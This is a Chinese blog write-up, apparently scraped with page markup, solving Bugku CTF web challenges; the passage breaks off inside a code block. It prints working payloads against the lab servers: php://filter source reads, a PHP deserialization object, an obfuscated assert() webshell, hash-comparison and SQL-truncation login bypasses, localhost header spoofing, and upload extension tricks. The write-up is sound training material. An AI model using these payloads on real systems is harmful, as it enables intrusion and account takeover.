同样的道理，使用 index.php?txt=php://input\u0026file=php://filter/read=convert.base64-encode/resource=index.php\n解码得到了index.php的源代码。\n\u003c?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)\u0026\u0026(file_get_contents($txt,'r')===\"welcome to the bugkuctf\")){ echo \"hello friend!\n\"; if(preg_match(\"/flag/\",$file)){ echo \"不能现在就给你flag哦\"; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo \"you are not the number of bugku ! \"; } ?\u003e 显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候 有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数 这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递PHP 的值的过程中,同时不丢失其类型和结构\n所以我们编写如下代码：\n\u003c?php Class Flag{ public $file='flag.php' } $a = new Flag; echo serialize($a); ?\u003e 输出O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}\n于是传入参数index.php?txt=welcome to the bugkuctf\u0026file=hint.php\u0026password=O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}\n得到flag\n过狗一句话 刚开始给我们的php代码：\n\u003c?php $poc=\"a#s#s#e#r#t\"; $poc_1=explode(\"#\",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?\u003e 看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思 assert（）一个东西，如果字符串会被当做代码执行，否则是false\n以下解法 试探一下：?index.php?s=phpinfo();//可以正常执行 ?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组\n显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以 字符？正则？ 打开网页，要求匹配的正则式子如下：\n/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i /。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等\n[[:punct:]] ：匹配任何标点符号；\n/i ：表示这个正则表达式对大小写不敏感； 一开始我写的匹配对象是这样的：\nhttp://123.206.87.240:8002/web10/?id=keykey00000key://keyb. 但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/ 变成这样就好了：\nhttp://123.206.87.240:8002/web10/?id=keykey00000key:///keyb. 前女友 打开源代码，发现在链接处有个链接，点进入是php代码\n\u003c?php if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2']) \u0026\u0026 isset($_GET['v3'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; $v3 = $_GET['v3']; if($v1 != $v2 \u0026\u0026 md5($v1) == md5($v2)){ if(!strcmp($v3, $flag)){ echo $flag; } } } ?\u003e 对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false ，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)\nhttp://123.206.31.85:49162/index.php?v1=s878926199a\u0026v2=s155964671a\u0026v3[]=1 或者 http://123.206.31.85:49162/index.php?v1[]=1\u0026v2[]=2\u0026v3[]=1 login1 打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里sql约束攻击\n总而言之为了创建一个新的admin，我们注册以下账户：\nusername：admin 1 password：2017zxwlB 注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限 制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。\n既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以 超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理 由此我们插入了一个admin用户，使用的是自己的密码就可以登陆\n登陆就好了。\n你从哪里来 题目说 你是从谷歌来的吗？，在burpsuite中添加referer:https://www.google.com就可以了\nmd5 collision 从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了\n程序员本地网站 要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！\n各种绕过 打开网页之后看到的代码如下\n\u003c?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag{xxxxxxxxxxxxxxxxxx}'; if (isset($_GET['uname']) and isset($_POST['passwd'])) { if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])\u0026($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; } ?\u003e sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等 ，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。\nweb8 打开网站显示代码\n\u003c?php extract($_GET);//解析所有通过get方式获取的变量 if (!empty($ac)) { $f = trim(file_get_contents($fn));//从打开fn所代表的文件，或者是文件流 if ($ac === $f)//强等于 { echo \"This is flag:\" .\" $flag\n\"; } else { echo \"sorry!\n\"; } } ?\u003e 可知有两种解法：\n解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)\n解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags， 那么让ac=flags，fn=flag.txt就可以得到flag了。\n细心 使用御剑软件扫描网站，发现有robots.txt,点进去显示\nUser-agent: * Disallow: /resusl.php 访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问\nHost: 127.0.0.1 Referer: 127.0.0.1 X-Forwarded-For: 127.0.0.1 Client-IP: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)\n接下来显示\nBy bugkuctf. if ($_GET[x]==$password) 此处省略1w字 试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag\nrobots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访 问的部分，或者指定搜索引擎只收录指定的内容。 当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来 确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。 求getshell（文件上传类型） 打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把 content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种\nphp2, php3, php4, php5, phps, pht, phtm, phtml 试了以上几种之后，php5可以拿到flag。\n",
  "wordCount" : "1011",
  "inLanguage": "en",
  "image":"https://ch3n9w.cpolar.cn/image-20211114140949068.png","datePublished": "2019-04-22T04:13:30Z",
  "dateModified": "2019-04-22T04:13:30Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      bugku writeup
    </h1>
    <div class="post-meta"><span title='2019-04-22 04:13:30 +0000 UTC'>April 22, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1011 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/image-20211114140949068.png 320w" 
            sizes="(min-width: 768px) 720px, 100vw" src="https://ch3n9w.cpolar.cn/posts/ctf-bugku-writeup/image-20211114140949068.png" alt="" 
            width="320" height="118">
        
</figure><div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#web3">web3</a></li>
    <li><a href="#你必须让他停下来">你必须让他停下来！</a></li>
    <li><a href="#本地包含">本地包含</a></li>
    <li><a href="#域名解析">域名解析</a></li>
    <li><a href="#你必须让他停下">你必须让他停下</a></li>
    <li><a href="#变量1">变量1</a></li>
    <li><a href="#web5">Web5</a></li>
    <li><a href="#头等舱">头等舱</a></li>
    <li><a href="#网站被黑">网站被黑</a></li>
    <li><a href="#管理员系统">管理员系统</a></li>
    <li><a href="#web4">web4</a></li>
    <li><a href="#flag在index里面">flag在index里面</a></li>
    <li><a href="#输入密码得到flag">输入密码得到flag</a></li>
    <li><a href="#点击一百万次">点击一百万次</a></li>
    <li><a href="#备份是个好习惯">备份是个好习惯</a>
      <ul>
        <li><a href="#知识点补充">知识点补充</a></li>
      </ul>
    </li>
    <li><a href="#成绩单">成绩单</a></li>
    <li><a href="#cookie欺骗">cookie欺骗</a></li>
    <li><a href="#bugku--insert-into">bugku&ndash;insert into</a></li>
    <li><a href="#never-give-up">never give up</a></li>
    <li><a href="#welcome-to-the-bugkuctf">welcome to the bugkuctf</a></li>
    <li><a href="#过狗一句话">过狗一句话</a></li>
    <li><a href="#字符正则">字符？正则？</a></li>
    <li><a href="#前女友">前女友</a></li>
    <li><a href="#login1">login1</a></li>
    <li><a href="#你从哪里来">你从哪里来</a></li>
    <li><a href="#md5-collision">md5 collision</a></li>
    <li><a href="#程序员本地网站">程序员本地网站</a></li>
    <li><a href="#各种绕过">各种绕过</a></li>
    <li><a href="#web8">web8</a></li>
    <li><a href="#细心">细心</a></li>
    <li><a href="#求getshell文件上传类型">求getshell（文件上传类型）</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>纪念那段岁月</p>
</blockquote>
<h2 id="web3">web3<a hidden class="anchor" aria-hidden="true" href="#web3">#</a></h2>
<p>网站里面循环弹出提示框，用chrome的开发者工具打开一片空白，
用ctrl+u查看源代码，发现一串</p>
<pre tabindex="0"><code>  &lt;!--&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;
  &amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;
  &amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;
</code></pre><p>这是unicode，转码即可</p>
<h2 id="你必须让他停下来">你必须让他停下来！<a hidden class="anchor" aria-hidden="true" href="#你必须让他停下来">#</a></h2>
<p>查看源代码竟然直接有flag了，网上的解法是抓包</p>
<h2 id="本地包含">本地包含<a hidden class="anchor" aria-hidden="true" href="#本地包含">#</a></h2>
<p>解法:利用hellow构造payload
$_REQUEST：默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。
var_dump():此函数显示有关包含其类型和值的一个或多个表达式的结构化信息。
递归地探索数组和对象，其中值缩进以显示结构。在这题里面只是显示变量的类型，对
eval并无影响，对于eval来说，和eval（$a）是一样的。</p>
<p>payload：/index.php?hello = show_source(&lsquo;flag.php&rsquo;)
网上的payload：/index.php?hello=1);show_source(&lsquo;flag.php&rsquo;);var_dump(</p>
<h2 id="域名解析">域名解析<a hidden class="anchor" aria-hidden="true" href="#域名解析">#</a></h2>
<p>编辑etc/hosts添加一条123.206.87.240	 flag.bugku.com，
在浏览器中打开flag.bugku.com即可得到flag。</p>
<p>反思：host请求头是http1.1添加的东西，
添加域名解析之后直接访问123.206.87.240却显示403，也就是说在https下主机名必不可少。</p>
<p>添加host之前访问ip地址结果显示错误400（缺少host）
添加host之后访问ip地址结果显示错误403（读取访问被禁）</p>
<h2 id="你必须让他停下">你必须让他停下<a hidden class="anchor" aria-hidden="true" href="#你必须让他停下">#</a></h2>
<p>使用burpsuite的repeater功能进行抓包操作，
通过多次点击go，最终发现在原先是“flag is here”的位置出现了flag</p>
<h2 id="变量1">变量1<a hidden class="anchor" aria-hidden="true" href="#变量1">#</a></h2>
<p>函数知识：
isset（）判断是否有输入
pre_match是正则表达式，引号中的内容都以/^开头，以$/结尾，\w+的意思是0<del>9 a</del>z A~Z，
输入的内容被限定了，所以不能输入代码</p>
<p>输入arg=GLOBALS，从代码中可知会给GLOBALS再套上一个$，就输出了flag</p>
<h2 id="web5">Web5<a hidden class="anchor" aria-hidden="true" href="#web5">#</a></h2>
<p>查看源代码，发现jother编码，打开控制台输入就行了</p>
<h2 id="头等舱">头等舱<a hidden class="anchor" aria-hidden="true" href="#头等舱">#</a></h2>
<p>打开网页显示什么都没有，查看源代码也什么都没有，打开控制台重新加载看头文件，什么也没有，
点击显示头文件源代码，显示flag（注释形式）</p>
<h2 id="网站被黑">网站被黑<a hidden class="anchor" aria-hidden="true" href="#网站被黑">#</a></h2>
<p>扫描端口</p>
<p>发现登陆界面</p>
<p>然后用burpsuite的intruder功能破解</p>
<h2 id="管理员系统">管理员系统<a hidden class="anchor" aria-hidden="true" href="#管理员系统">#</a></h2>
<p>实在没有头绪，上网查说这是X-Forwarded-For:简称XFF头，它代表客户端，
也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。
也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，
都会在尾部添加一个代理的ip，
X-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。
同时查看网页源代码发现，有一串注释，查到说是base64编码，
特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，
添加X-Forwarded-For：127。0.0.1后发送，得到了flag</p>
<p>参考资料：ctf中常见的编码格式： <a href="https://www.cnblogs.com/gwind/p/7997922.html">https://www.cnblogs.com/gwind/p/7997922.html</a></p>
<h2 id="web4">web4<a hidden class="anchor" aria-hidden="true" href="#web4">#</a></h2>
<p>查看源代码，发现一串url编码的东西，
Eval函数会将里面的内容作为代码执行，unescape将其解码。要解码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%66%</span><span style="color:#e6db74">75</span><span style="color:#e6db74">%6e%63%</span><span style="color:#e6db74">74</span><span style="color:#e6db74">%69%</span><span style="color:#e6db74">6f</span><span style="color:#e6db74">%6e%20%</span><span style="color:#e6db74">63</span><span style="color:#e6db74">%68%</span><span style="color:#e6db74">65</span><span style="color:#e6db74">%63%</span><span style="color:#e6db74">6b</span><span style="color:#e6db74">%53%</span><span style="color:#e6db74">75</span><span style="color:#e6db74">%62%</span><span style="color:#e6db74">6d</span><span style="color:#e6db74">%69%</span><span style="color:#e6db74">74</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">76</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">67</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">45</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">42</span><span style="color:#f92672">%</span><span style="color:#ae81ff">79</span><span style="color:#f92672">%</span><span style="color:#ae81ff">49</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">70</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">77</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">79</span><span style="color:#f92672">%</span><span style="color:#ae81ff">70</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">36</span><span style="color:#f92672">%</span><span style="color:#ae81ff">37</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">37</span><span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">39</span><span style="color:#f92672">%</span><span style="color:#ae81ff">62</span><span style="color:#f92672">%</span><span style="color:#ae81ff">32</span><span style="color:#f92672">%</span><span style="color:#ae81ff">62</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%61%</span><span style="color:#e6db74">61</span><span style="color:#e6db74">%36%</span><span style="color:#e6db74">34</span><span style="color:#e6db74">%38%</span><span style="color:#e6db74">63</span><span style="color:#e6db74">%66%</span><span style="color:#e6db74">36</span><span style="color:#e6db74">%65%</span><span style="color:#e6db74">38</span><span style="color:#e6db74">%37%</span><span style="color:#e6db74">61</span><span style="color:#e6db74">%37%</span><span style="color:#e6db74">31</span><span style="color:#e6db74">%31%</span><span style="color:#e6db74">34</span><span style="color:#e6db74">%66%</span><span style="color:#e6db74">31</span><span style="color:#e6db74">%22%</span><span style="color:#e6db74">3d</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">76</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">30</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">45</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">72</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">21</span><span style="color:#f92672">%</span><span style="color:#ae81ff">31</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">67</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">45</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">42</span><span style="color:#f92672">%</span><span style="color:#ae81ff">79</span><span style="color:#f92672">%</span><span style="color:#ae81ff">49</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">76</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">51</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">62</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">68</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">53</span><span 